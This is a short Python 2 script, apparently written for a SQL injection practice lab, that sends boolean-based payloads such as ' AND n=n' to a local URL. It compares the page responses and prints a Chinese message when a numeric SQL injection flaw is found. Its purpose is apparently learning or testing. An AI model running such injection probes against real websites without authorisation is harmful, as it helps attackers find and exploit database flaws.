#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re,random
from lib.core import Download
Downloader = Download.Downloader()
url = "http://127.0.0.1/Less-2/?id=1"
content = {}
content["origin"] = Downloader.get(url)


BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)")
for test_payload in BOOLEAN_TESTS:
    RANDINT = random.randint(1, 255)
    _url = url + test_payload % (RANDINT, RANDINT)
    content["true"] = Downloader.get(_url)
    _url = url + test_payload % (RANDINT, RANDINT + 1)
    content["false"] = Downloader.get(_url)
    if content["origin"] == content["true"]!= content["false"]:
        print url + "存在数字型SQL注入漏洞"
